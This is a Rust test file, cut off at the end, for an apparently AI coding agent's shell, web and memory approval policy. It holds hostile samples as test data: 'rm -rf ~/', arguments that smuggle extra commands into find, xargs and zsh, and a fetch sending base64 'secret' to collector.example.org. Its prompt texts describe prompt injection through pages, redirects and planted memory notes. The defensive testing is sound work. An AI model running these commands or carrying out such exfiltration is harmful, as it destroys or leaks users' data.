    let mut invoke = |name: &str, raw: &str| { let args = json::parse(raw).unwrap(); let call = ToolCall { id: "pdf".into(), name: name.into(), arguments: raw.into() }; tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap() };
    let whole = invoke("workspace_read", r#"{"path":"manual.pdf"}"#);
    assert!(whole.starts_with("Path: manual.pdf\nPDF text layer extracted by Vade: 2 pages.") && whole.ends_with("page 1 of 2\nInstall the tool\n\npage 2 of 2\nRun the tool\n"), "{whole}");
    let part = invoke("workspace_read", r#"{"path":"manual.pdf","offset":0,"limit":20}"#);
    assert!(part.contains("Read bytes 0..20 of ") && part.contains(" of extracted PDF text (source PDF ") && part.ends_with("next offset 20).\nPDF text layer extra"), "{part}");
    assert_eq!(invoke("workspace_read_lines", r#"{"path":"manual.pdf","start_line":1,"end_line":3}"#), "Discovery refused: This file is a PDF. Use workspace_read to read its text.");
}
#[test]
fn workspace_read_lines_names_workspace_read_for_an_ascii_pdf() {
    let f = Fixture::new(); let pdf = crate::pdf::tests::sample_ascii(&["Plain"]); assert!(pdf.is_ascii()); std::fs::write(f.0.join("plain.pdf"), pdf).unwrap(); let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
    let raw = r#"{"path":"plain.pdf","start_line":1,"end_line":3}"#; let args = json::parse(raw).unwrap(); let call = ToolCall { id: "pdf".into(), name: "workspace_read_lines".into(), arguments: raw.into() };
    assert_eq!(tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap(), "Discovery refused: This file is a PDF. Use workspace_read to read its text.");
}
/// Keeps every shell approval decision, like a session journal.
#[derive(Default)]
struct Decisions(Vec<Value>);
impl Access for Decisions {
    fn check_capacity(&mut self) -> io::Result<()> {
        Ok(())
    }
    fn retain(&mut self, _: &str) -> io::Result<String> {
        Ok("a-0".into())
    }
    fn read(&mut self, _: &str, _: usize, _: usize, _: usize) -> io::Result<String> {
        Err(io::Error::other("none"))
    }
    fn record_approval(&mut self, decision: &Value) -> io::Result<()> {
        self.0.push(decision.clone());
        Ok(())
    }
}
fn shell_call<F: FnMut(Preview<'_>, &AtomicBool) -> bool>(tools: &mut CodingTools<'_, F>, script: &str) -> Result<String, ToolError> {
    argv_call(tools, &["/bin/sh", "-c", script])
}
fn argv_call<F: FnMut(Preview<'_>, &AtomicBool) -> bool>(tools: &mut CodingTools<'_, F>, argv: &[&str]) -> Result<String, ToolError> {
    let args = Value::Object(vec![
        ("argv".into(), Value::Array(argv.iter().map(|s| Value::String((*s).into())).collect())),
        ("timeout_ms".into(), Value::Number("20000".into())),
    ]);
    let call = ToolCall { id: "safety".into(), name: "workspace_shell".into(), arguments: json::stringify(&args).unwrap() };
    tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false))
}
fn decision(record: &Value) -> (&str, &str) {
    (record.get("decision").and_then(Value::as_str).unwrap(), record.get("class").and_then(Value::as_str).unwrap())
}
#[test]
fn blocked_commands_never_reach_a_preview_even_without_prompts() {
    if !cfg!(target_os = "macos") {
        return;
    }
    let f = Fixture::new();
    let w = f.workspace();
    for policy in [ApprovalPolicy::Auto, ApprovalPolicy::Ask, ApprovalPolicy::Never] {
        let mut log = Decisions::default();
        let mut tools = CodingTools::new(&w, policy, |_: Preview<'_>, _: &AtomicBool| panic!("blocked commands are refused before any preview")).with_artifacts(&mut log);
        let out = shell_call(&mut tools, "echo start; rm -rf ~/").unwrap();
        let out = json::parse(&out).unwrap();
        assert_eq!(out.get("error").and_then(Value::as_str), Some("blocked"));
        assert!(out.get("message").and_then(Value::as_str).unwrap().contains("not with --yes"));
        assert!(!tools.last_side_effect_uncertain());
        drop(tools);
        assert_eq!(log.0.iter().map(decision).collect::<Vec<_>>(), [("blocked", "blocked")]);
    }
}
#[test]
fn non_interactive_runs_deny_commands_that_need_approval_unless_listed_or_prompts_are_off() {
    if !cfg!(target_os = "macos") {
        return;
    }
    let f = Fixture::new();
    std::fs::create_dir(f.0.join("build")).unwrap();
    let w = f.workspace();
    let none = shell::permissions::Approvals::new(None, None, false).unwrap();
    let mut log = Decisions::default();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        assert!(!preview.approval_required, "no prompt without a terminal");
        true
    })
    .with_approvals(&none)
    .with_artifacts(&mut log);
    // The error is a tool result the model can read; nothing ran.
    let refused = json::parse(&shell_call(&mut tools, "rm -rf build").unwrap()).unwrap();
    assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"));
    let message = refused.get("message").and_then(Value::as_str).unwrap();
    assert!(message.contains("deletes files") && message.contains("non-interactive") && message.contains("--yes"), "{message}");
    assert!(f.0.join("build").is_dir());
    // A command on the sandbox's read-only list still needs approval when
    // the checker asks; a computed `find` action and `env -P` ask too, and
    // so do a program lookup or config setting, a file name slot and
    // operands that split (review of f29e33b). csh, tcsh and fish code and a
    // zsh `repeat` count that is not a number ask too (review of b476cd3).
    let argvs: [&[&str]; 15] = [
        &["cat", "permissions.json"],
        &["cat", "Keychains/file"],
        &["env", "-P", "./tools", "cat"],
        &["/bin/sh", "-c", "action=-delete; find build \"$action\""],
        &["/bin/zsh", "-c", "path=./tools; cat input"],
        &["/bin/sh", "-c", "RIPGREP_CONFIG_PATH=rg.conf rg needle input"],
        &["/bin/sh", "-c", "find 'x; touch find-code-marker' -exec sh -c 'echo {}' \\;"],
        &["/bin/sh", "-c", "find -f -ofind-marker -- -exec sort '{}' input \\;"],
        &["/bin/sh", "-c", "files='input uniq-marker'; uniq -- $files"],
        &["/bin/sh", "-c", "printf 'input xargs-marker' | xargs uniq --"],
        &["/bin/csh", "-f", "-c", "set path = ./tools; cat input"],
        &["/bin/tcsh", "-f", "-c", "set path=./tools; cat input"],
        &["fish", "-c", "set PATH ./tools; cat input"],
        &["/bin/zsh", "-f", "-c", "u='argv[$'; v='(touch repeat-marker)]'; x=$u$v; repeat x; do echo ok; done"],
        &["/bin/zsh", "-f", "-c", "repeat \"$1\"; do echo ok; done", "_", "argv[$(touch repeat-arg-marker)]"],
    ];
    for argv in argvs {
        let refused = json::parse(&argv_call(&mut tools, argv).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"), "{argv:?}");
    }
    assert!(f.0.join("build").is_dir());
    for marker in ["find-code-marker", "find-marker", "uniq-marker", "xargs-marker", "repeat-marker", "repeat-arg-marker"] {
        assert!(!f.0.join(marker).exists(), "{marker}");
    }
    // By default read-only and build commands ask too. With the
    // experimental checker on, the commands it reads as safe run.
    let readonly = ["/bin/sh", "-c", "ls && git status --short 2>/dev/null; true"];
    assert!(argv_call(&mut tools, &readonly).unwrap().contains("approval_required"));
    none.set_checker(true);
    assert!(argv_call(&mut tools, &readonly).unwrap().contains("exit_code: Some(0)"));
    none.set_checker(false);
    drop(tools);
    assert_eq!(log.0.iter().map(decision).collect::<Vec<_>>(), [("denied_no_terminal", "needs approval"); 17]);
    // A project rule approves the same command without a terminal.
    let rules = f.0.join("rules.json");
    std::fs::write(&rules, shell::permissions::render(&[vec!["rm".into(), "-rf".into(), "build".into()]])).unwrap();
    let listed = shell::permissions::Approvals::new(Some(rules), None, false).unwrap();
    let mut log = Decisions::default();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        assert!(!preview.approval_required && (preview.title != "Command" || preview.detail.contains("allowed by project: rm -rf build")));
        true
    })
    .with_approvals(&listed)
    .with_artifacts(&mut log);
    // The rule is the exact argv: the same words as a script still ask.
    assert!(shell_call(&mut tools, "rm -rf build").unwrap().contains("approval_required"));
    assert!(f.0.join("build").exists());
    assert!(argv_call(&mut tools, &["rm", "-rf", "build"]).unwrap().contains("exit_code: Some(0)"));
    assert!(!f.0.join("build").exists());
    drop(tools);
    assert_eq!(log.0.iter().map(decision).collect::<Vec<_>>(), [("denied_no_terminal", "needs approval"), ("allowed_by_rule", "needs approval")]);
    assert_eq!(log.0[1].get("rules").and_then(Value::as_array).unwrap(), [Value::String("project: rm -rf build".into())]);
    // --yes (auto) runs it without a rule and records why.
    std::fs::create_dir(f.0.join("build")).unwrap();
    let mut log = Decisions::default();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |preview: Preview<'_>, _: &AtomicBool| !preview.approval_required).with_approvals(&none).with_artifacts(&mut log);
    assert!(shell_call(&mut tools, "rm -rf build").unwrap().contains("exit_code: Some(0)"));
    drop(tools);
    assert_eq!(log.0.iter().map(decision).collect::<Vec<_>>(), [("allowed_by_flag", "needs approval")]);
}
#[test]
fn an_always_answer_for_the_session_skips_the_next_prompt() {
    if !cfg!(target_os = "macos") {
        return;
    }
    let f = Fixture::new();
    let w = f.workspace();
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
    let mut prompts = 0;
    let mut notes = Vec::new();
    let mut log = Decisions::default();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required {
            prompts += 1;
            assert!(preview.detail.contains("s (this exact argv, for this session), p (this exact argv, in .vade/permissions.json)"), "{}", preview.detail);
            // The prompt shows what runs: the folder, the whole environment
            // (the list the command gets) and the timeout.
            let root = shell::visible_json(&[w.root().display().to_string()]);
            assert!(preview.detail.contains(&format!("\nFolder: {root}\n")), "{}", preview.detail);
            let environment = preview.detail.lines().find_map(|line| line.strip_prefix("Environment (only these; <build> is the session build folder): ")).unwrap();
            let names: Vec<String> = crate::json::parse(environment).unwrap().as_array().unwrap().iter().map(|w| w.as_str().unwrap().split('=').next().unwrap().to_owned()).collect();
            assert_eq!(names[..3], ["LANG", "PATH", "HOME"]);
            assert!(names.contains(&"CARGO_NET_OFFLINE".to_owned()) && environment.contains("HOME=<build>/home"), "{environment}");
            assert!(preview.detail.contains("timeout=20000ms") && !preview.detail.contains("Runs as:"), "{}", preview.detail);
            approvals.choose(shell::permissions::Scope::Session);
        }
        if preview.title == "Allow list" {
            notes.push(preview.detail.to_owned());
        }
        true
    })
    .with_approvals(&approvals)
    .with_artifacts(&mut log);
    for name in ["one.txt", "two.txt"] {
        assert!(argv_call(&mut tools, &["touch", name]).unwrap().contains("exit_code: Some(0)"));
    }
    // `touch one.txt` and `touch two.txt` are different exact rules.
    assert!(argv_call(&mut tools, &["touch", "one.txt"]).unwrap().contains("exit_code: Some(0)"));
    drop(tools);
    assert_eq!(prompts, 2);
    assert_eq!(notes.len(), 2);
    assert_eq!(
        log.0.iter().map(decision).collect::<Vec<_>>(),
        [("approved", "needs approval"), ("approved", "needs approval"), ("allowed_by_rule", "needs approval")]
    );
    assert_eq!(log.0[0].get("rules").and_then(Value::as_array).unwrap(), [Value::String("session: touch one.txt".into())]);
    // A person's no is recorded too; the command does not run.
    let mut log = Decisions::default();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| !preview.approval_required).with_artifacts(&mut log);
    assert_eq!(shell_call(&mut tools, "git push").unwrap_err(), ToolError::Denied);
    drop(tools);
    assert_eq!(log.0.iter().map(decision).collect::<Vec<_>>(), [("denied", "needs approval")]);
    // A read-only command shows the fixed system form that really runs.
    let mut shown = String::new();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        shown = preview.detail.to_owned();
        false
    });
    assert_eq!(argv_call(&mut tools, &["git", "status"]).unwrap_err(), ToolError::Denied);
    drop(tools);
    let runs = shown.lines().find_map(|line| line.strip_prefix("Runs as: ")).unwrap_or_else(|| panic!("{shown}"));
    assert!(runs.starts_with("[\"/usr/bin/git\",\"--no-pager\"") && runs.contains("\"status\"") && runs.contains("core.hooksPath=/dev/null"), "{runs}");
}
/// Review of 583ad99, item 2: an approval for one argv never approves a
/// script whose words expand to other files.
#[test]
fn a_rule_never_approves_words_that_expand() {
    if !cfg!(target_os = "macos") {
        return;
    }
    let f = Fixture::new();
    let w = f.workspace();
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
    let mut prompts = 0;
    let mut notes = Vec::new();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.title == "Allow list" {
            notes.push(preview.detail.to_owned());
        }
        if !preview.approval_required {
            return true;
        }
        prompts += 1;
        approvals.choose(shell::permissions::Scope::Session);
        // Approve the first two prompts only.
        prompts <= 2
    })
    .with_approvals(&approvals);
    // A word with braces gets no rule: approved once, it makes one file.
    assert!(argv_call(&mut tools, &["touch", "item{1,2}"]).unwrap().contains("exit_code: Some(0)"));
    assert!(f.0.join("item{1,2}").exists());
    // A plain word gets the exact rule.
    assert!(argv_call(&mut tools, &["touch", "item1"]).unwrap().contains("exit_code: Some(0)"));
    std::fs::remove_file(f.0.join("item1")).unwrap();
    // Neither approval covers a script: these ask, the person says no, and
    // no file appears.
    for script in ["touch item{1,2}", "touch item[12]", "touch item1"] {
        assert_eq!(argv_call(&mut tools, &["/bin/bash", "-c", script]).unwrap_err(), ToolError::Denied, "{script}");
    }
    drop(tools);
    assert_eq!(prompts, 5);
    assert!(notes[0].contains("cannot go on an allow list") && notes[1].contains("Added touch item1"), "{notes:?}");
    for name in ["item1", "item2"] {
        assert!(!f.0.join(name).exists(), "{name}");
    }
}
#[test]
fn an_approval_the_journal_cannot_record_saves_no_rule() {
    if !cfg!(target_os = "macos") {
        return;
    }
    struct Broken;
    impl Access for Broken {
        fn check_capacity(&mut self) -> io::Result<()> {
            Ok(())
        }
        fn retain(&mut self, _: &str) -> io::Result<String> {
            Ok("a-0".into())
        }
        fn read(&mut self, _: &str, _: usize, _: usize, _: usize) -> io::Result<String> {
            Err(io::Error::other("none"))
        }
        fn record_approval(&mut self, _: &Value) -> io::Result<()> {
            Err(io::Error::other("disk full"))
        }
    }
    let f = Fixture::new();
    let w = f.workspace();
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
    let mut journal = Broken;
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required {
            approvals.choose(shell::permissions::Scope::Session);
        }
        true
    })
    .with_approvals(&approvals)
    .with_artifacts(&mut journal);
    // The exact argv qualifies for a rule, so a rule saved before the
    // journal fails would show (review of aacf3c9, item 6).
    let argv = ["touch", "one.txt"].map(String::from);
    let verdict = shell::policy::decide(&argv, &f.0, false);
    assert!(shell::policy::rule_for(&argv, &verdict).is_some());
    assert_eq!(argv_call(&mut tools, &["touch", "one.txt"]).unwrap_err(), ToolError::Failed);
    drop(tools);
    assert!(!f.0.join("one.txt").exists());
    assert_eq!(approvals.allowed(&argv, &verdict, &f.0), None);
    assert!(approvals.summary().contains("0 session"), "{}", approvals.summary());
}
#[test]
fn workspace_edit_lines_accepts_earlier_read_tag_after_reading_second_file() {
    let f = Fixture::new();
    f.write("a.rs", "a1\na2\na3\n");
    f.write("b.rs", "b1\nb2\n");
    let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
    let mut invoke = |name: &str, args: String| { let args = json::parse(&args).unwrap(); let call = ToolCall { id: "lines".into(), name: name.into(), arguments: json::stringify(&args).unwrap() }; tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap() };
    let read = |path: &str, start: usize, end: usize| format!(r#"{{"path":"{path}","start_line":{start},"end_line":{end}}}"#);
    let tag = |out: String| json::parse(&out).unwrap().get("edit_tag").and_then(Value::as_str).unwrap().to_owned();
    let a = tag(invoke("workspace_read_lines", read("a.rs", 1, 1)));
    assert_eq!(tag(invoke("workspace_read_lines", read("a.rs", 3, 3))), a);
    let b = tag(invoke("workspace_read_lines", read("b.rs", 1, 2)));
    let edit = |path: &str, tag: &str, line: usize, text: &str| format!(r#"{{"path":"{path}","start_line":{line},"end_line":{line},"edit_tag":{},"operation":"replace","new_text":{}}}"#, json::quote(tag), json::quote(text));
    // Both earlier ranges of a.rs stay editable after b.rs was read.
    assert!(invoke("workspace_edit_lines", edit("a.rs", &a, 1, "A1\n")).starts_with("Applied "));
    assert!(invoke("workspace_edit_lines", edit("b.rs", &b, 2, "B2\n")).starts_with("Applied "));
    assert_eq!((f.read("a.rs"), f.read("b.rs")), ("A1\na2\na3\n".into(), "b1\nB2\n".into()));
    // The old a.rs tag is stale after its own edit, and line 2 was never shown.
    assert!(invoke("workspace_edit_lines", edit("a.rs", &a, 3, "A3\n")).contains("stale edit_tag"));
    let a = tag(invoke("workspace_read_lines", read("a.rs", 1, 1)));
    assert!(invoke("workspace_edit_lines", edit("a.rs", &a, 2, "A2\n")).contains("not fully shown"));
}
#[test]
fn shell_receipt_rewrites_only_whole_workspace_root_paths() {
    let root = "/work/repo";
    let text = "/work/repo/src/a.rs:1 (/work/repo) /work/repo_old/file.rs /private/work/repo/x /work/repo: done";
    assert_eq!(relative_root(text, root), "./src/a.rs:1 (.) /work/repo_old/file.rs /private/work/repo/x .: done");
}
#[test]
#[cfg(target_os = "macos")]
fn shell_capture_uses_the_whole_output_budget() {
    let f = Fixture::new();
    let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
    // 30,000 bytes of stderr fit the 64 KiB budget with nothing omitted.
    let args = json::parse(r#"{"argv":["/bin/sh","-c","i=0; while [ $i -lt 600 ]; do echo 0123456789012345678901234567890123456789012345678 >&2; i=$((i+1)); done"],"timeout_ms":20000}"#).unwrap();
    let call = ToolCall { id: "loud".into(), name: "workspace_shell".into(), arguments: json::stringify(&args).unwrap() };
    let out = tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 64 * 1024 }, &AtomicBool::new(false)).unwrap();
    assert!(out.contains("stderr_read=30000 stdout_omitted=0 stderr_omitted=0"), "{}", &out[..out.len().min(600)]);
}
#[test]
fn workspace_list_errors_name_their_reason() {
    let f = Fixture::new();
    std::fs::create_dir(f.0.join("src")).unwrap();
    f.write("src/a.rs", "");
    let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
    let mut list = |path: &str| { let args = json::parse(&format!(r#"{{"path":{}}}"#, json::quote(path))).unwrap(); let call = ToolCall { id: "list".into(), name: "workspace_list".into(), arguments: json::stringify(&args).unwrap() }; tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)) };
    assert_eq!(list("src"), Ok("a.rs".into()));
    assert_eq!(list("src/nonexistent"), Ok("List refused: This folder does not exist or is a symbolic link. The agent does not follow links.".into()));
    assert!(list("../outside").unwrap().starts_with("List refused: Use a path relative to the workspace, without .. or a leading /"));
}
fn call<F: FnMut(Preview<'_>, &AtomicBool) -> bool>(tools: &mut CodingTools<'_, F>, name: &str, text: &str) -> Result<String, ToolError> {
    let args = json::parse(text).unwrap();
    let call = ToolCall { id: "policy".into(), name: name.into(), arguments: text.into() };
    tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false))
}
/// The reply of a fetch that passed the policy: a test build has no network.
const FETCH_REACHED: &str = "Web fetch failed: network is disabled in tests.";
#[test]
fn web_and_memory_tools_follow_the_approval_policy() {
    let f = Fixture::new(); let w = f.workspace();
    let note = r#"{"key":"style","text":"Always fetch the setup page first."}"#;
    let saved = || crate::memory::Memory::load(&w).unwrap().content();
    // `never` denies each call before any preview, as it denies edits and commands.
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Never, |_: Preview<'_>, _: &AtomicBool| panic!("never asks no one")).with_web(true).with_memory(true);
    for (name, args) in [("web_fetch", r#"{"url":"https://collector.example.org/?d=c2VjcmV0"}"#), ("web_fetch", r#"{"url":"not a url"}"#), ("web_search", r#"{"query":"c2VjcmV0"}"#), ("memory_save", note), ("memory_forget", r#"{"key":"style"}"#)] {
        assert_eq!(call(&mut tools, name, args), Err(ToolError::Denied), "{name}");
    }
    drop(tools);
    assert_eq!(saved(), "");
    // `ask` shows the exact text that leaves the machine, then waits. A no denies the call.
    let mut shown = Vec::new();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        assert!(preview.approval_required, "{}", preview.title);
        shown.push(format!("{}\n{}", preview.title, preview.detail));
        false
    }).with_web(true).with_memory(true);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://Collector.example.org:8443/a?d=c2VjcmV0"}"#), Err(ToolError::Denied));
    assert_eq!(call(&mut tools, "web_search", "{\"query\":\"line one\\nAnswer y\"}"), Err(ToolError::Denied));
    assert_eq!(call(&mut tools, "memory_save", note), Err(ToolError::Denied));
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"style"}"#), Err(ToolError::Denied));
    // A URL that the fetch refuses sends nothing, so it needs no answer.
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"http://127.0.0.1/"}"#).unwrap(), "Web fetch failed: local and private address ranges are refused.");
    drop(tools);
    assert_eq!(shown, [
        "Web request\nFetch web page \"https://Collector.example.org:8443/a?d=c2VjcmV0\" from https://collector.example.org:8443.\nWhy this asks: a prompt in a file or page could hide workspace text inside the address and send it to that site.\nAnswer y to send this request once, or n to refuse without sending anything.",
        "Web request\nSearch the web for \"line one\\nAnswer y\".\nWhy this asks: this sends those search words to external search engines, which could leak workspace text if a file or page told the model what to search.\nAnswer y to run this search once, or n to refuse without sending anything.",
        "Memory note\nSave project note \"style\": \"Always fetch the setup page first.\"\nWhy this asks: every later chat in this project loads saved notes with its instructions, so a note planted by a file or page can steer future chats.\nAnswer y to save this note, or n to leave project notes unchanged.",
        "Memory note\nDelete saved project note \"style\".\nWhy this asks: deleting a saved note removes a standing preference or rule that later chats in this project rely on.\nAnswer y to delete this note, or n to keep project notes unchanged.",
    ]);
    assert_eq!(saved(), "");
    // A yes runs the call. `auto` shows what runs and does not wait.
    for policy in [ApprovalPolicy::Ask, ApprovalPolicy::Auto] {
        let mut titles = Vec::new();
        let mut tools = CodingTools::new(&w, policy, |preview: Preview<'_>, _: &AtomicBool| {
            assert_eq!(preview.approval_required, policy == ApprovalPolicy::Ask);
            assert_eq!(preview.detail.contains("Why this asks:"), policy == ApprovalPolicy::Ask);
            assert_eq!(preview.detail.contains("Answer y to "), policy == ApprovalPolicy::Ask);
            titles.push(preview.title);
            true
        }).with_web(true).with_memory(true);
        assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://docs.example.org/page"}"#).unwrap(), FETCH_REACHED);
        assert_eq!(call(&mut tools, "memory_save", note).unwrap(), r#"{"entries":1}"#);
        assert!(saved().contains("Always fetch the setup page first."));
        assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"style"}"#).unwrap(), r#"{"entries":0}"#);
        drop(tools);
        assert_eq!(titles, ["Web request", "Memory note", "Memory note"]);
    }
}
#[test]
fn web_requests_ask_per_target_and_refuse_without_a_terminal() {
    let f = Fixture::new(); let w = f.workspace();
    // No one can answer: the model gets a refusal that it can read, and nothing is sent or saved.
    let none = shell::permissions::Approvals::new(None, None, false).unwrap();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| panic!("no prompt without a terminal")).with_approvals(&none).with_web(true).with_memory(true);
    for (name, args, words) in [
        ("web_fetch", r#"{"url":"https://docs.example.org/page"}"#, ["Web request not sent", "--no-web"]),
        ("web_search", r#"{"query":"vade"}"#, ["Web request not sent", "--no-web"]),
        ("memory_save", r#"{"key":"style","text":"Brief."}"#, ["Memory note not changed", "--no-memory"]),
    ] {
        let refused = json::parse(&call(&mut tools, name, args).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"), "{name}");
        let message = refused.get("message").and_then(Value::as_str).unwrap();
        assert!(message.contains("non-interactive") && message.contains("--yes") && words.iter().all(|word| message.contains(word)), "{message}");
    }
    drop(tools);
    assert_eq!(crate::memory::Memory::load(&w).unwrap().content(), "");
    // `s` approves one site (scheme, host and port) for the session; another site asks again.
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
    let (mut prompts, mut notices) = (Vec::new(), Vec::new());
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required {
            assert!(preview.detail.contains("\nWhy this asks: ") && preview.detail.ends_with(" for this session, or n to refuse without sending anything."), "{}", preview.detail);
            prompts.push(preview.detail.lines().next().unwrap().to_owned());
            approvals.choose(if preview.detail.contains("once.example.org") { shell::permissions::Scope::Once } else { shell::permissions::Scope::Session });
        } else {
            notices.push(format!("{}: {}", preview.title, preview.detail.lines().last().unwrap()));
        }
        true
    }).with_approvals(&approvals).with_web(true);
    for url in ["https://docs.example.org/a", "https://DOCS.example.org/b?x=1", "https://docs.example.org:8443/a", "https://once.example.org/a", "https://once.example.org/a", "https://docs.example.org/c"] {
        assert_eq!(call(&mut tools, "web_fetch", &format!(r#"{{"url":"{url}"}}"#)).unwrap(), FETCH_REACHED, "{url}");
    }
    drop(tools);
    assert_eq!(prompts, [
        "Fetch web page \"https://docs.example.org/a\" from https://docs.example.org.",
        "Fetch web page \"https://docs.example.org:8443/a\" from https://docs.example.org:8443.",
        "Fetch web page \"https://once.example.org/a\" from https://once.example.org.",
        "Fetch web page \"https://once.example.org/a\" from https://once.example.org.",
    ]);
    assert_eq!(notices, [
        "Web approval: Requests to the site https://docs.example.org need no approval for the rest of this session.",
        "Web request: Fetch web page \"https://DOCS.example.org/b?x=1\" from https://docs.example.org.",
        "Web approval: Requests to the site https://docs.example.org:8443 need no approval for the rest of this session.",
        "Web request: Fetch web page \"https://docs.example.org/c\" from https://docs.example.org.",
    ]);
    // The approval names the scheme too: the same host over plain http is another site.
    assert!(approvals.web_allowed("https://docs.example.org") && !approvals.web_allowed("http://docs.example.org") && !approvals.web_allowed("https://once.example.org"));
    // A new, resumed or forked session asks again.
    approvals.new_session().unwrap();
    assert!(!approvals.web_allowed("https://docs.example.org"));
}
#[test]
fn a_redirect_to_another_site_needs_its_own_approval() {
    let f = Fixture::new(); let w = f.workspace();
    let cancel = AtomicBool::new(false);
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
    approvals.allow_web("https://docs.example.org");
    // The test changes the answer between calls, so the callback reads it from a cell.
    let (prompts, answer) = (std::cell::RefCell::new(Vec::new()), std::cell::Cell::new(None));
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if !preview.approval_required { return true; }
        assert_eq!(preview.title, "Web redirect");
        prompts.borrow_mut().push(preview.detail.to_owned());
        answer.get().is_some_and(|scope| { approvals.choose(scope); true })
    }).with_approvals(&approvals).with_web(true);
    // The approved site sends the request on to a site that no one approved. The person sees the new URL and says no.
    let leak = "https://collector.example.org/?d=c2VjcmV0";
    assert_eq!(tools.approve_redirect("https://docs.example.org/go?to=x", leak, &cancel), Err(ToolError::Denied));
    // A yes for one request does not approve the site. An `s` answer does.
    for (scope, asked) in [(shell::permissions::Scope::Once, 2), (shell::permissions::Scope::Once, 3), (shell::permissions::Scope::Session, 4), (shell::permissions::Scope::Session, 4)] {
        answer.set(Some(scope));
        assert_eq!(tools.approve_redirect("https://docs.example.org/go?to=x", leak, &cancel), Ok(()));
        assert_eq!(prompts.borrow().len(), asked);
    }
    // A step from https to http on the approved host is another site.
    answer.set(None);
    assert_eq!(tools.approve_redirect("https://docs.example.org/a", "http://docs.example.org/a", &cancel), Err(ToolError::Denied));
    drop(tools);
    let prompts = prompts.into_inner();
    assert_eq!(prompts[0], "Follow redirect from https://docs.example.org to \"https://collector.example.org/?d=c2VjcmV0\" on https://collector.example.org.\nWhy this asks: an approved site can forward a link to an unapproved site and send text hidden in the address there.\nAnswer y to follow this redirect once, s to allow requests to https://collector.example.org for this session, or n to stop the redirect without contacting that site.");
    assert_eq!(prompts[4], "Follow redirect from https://docs.example.org to \"http://docs.example.org/a\" on http://docs.example.org.\nWhy this asks: following this redirect switches from HTTPS to unencrypted HTTP, exposing the address and reply on the network.\nAnswer y to follow this redirect once, s to allow requests to http://docs.example.org for this session, or n to stop the redirect without contacting that site.");
    assert!(approvals.web_allowed("https://collector.example.org") && !approvals.web_allowed("http://docs.example.org"));
    // No one can answer: the redirect is not followed. `auto` follows it and shows it. `never` denies it.
    let none = shell::permissions::Approvals::new(None, None, false).unwrap();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| panic!("no prompt without a terminal")).with_approvals(&none).with_web(true);
    assert_eq!(tools.approve_redirect("https://docs.example.org/go", leak, &cancel), Err(ToolError::Denied));
    let mut shown = 0;
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |preview: Preview<'_>, _: &AtomicBool| { assert!(!preview.approval_required && preview.title == "Web redirect"); shown += 1; true }).with_web(true);
    assert_eq!(tools.approve_redirect("https://docs.example.org/go", leak, &cancel), Ok(()));
    drop(tools);
    assert_eq!(shown, 1);
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Never, |_: Preview<'_>, _: &AtomicBool| panic!("never asks no one")).with_web(true);
    assert_eq!(tools.approve_redirect("https://docs.example.org/go", leak, &cancel), Err(ToolError::Denied));
}
#[test]
fn approval_prompts_state_what_why_and_choices_in_plain_words() {
    let f = Fixture::new(); let w = f.workspace();
    let cancel = AtomicBool::new(false);
    let approvals = shell::permissions::Approvals::new(None, None, true).unwrap();
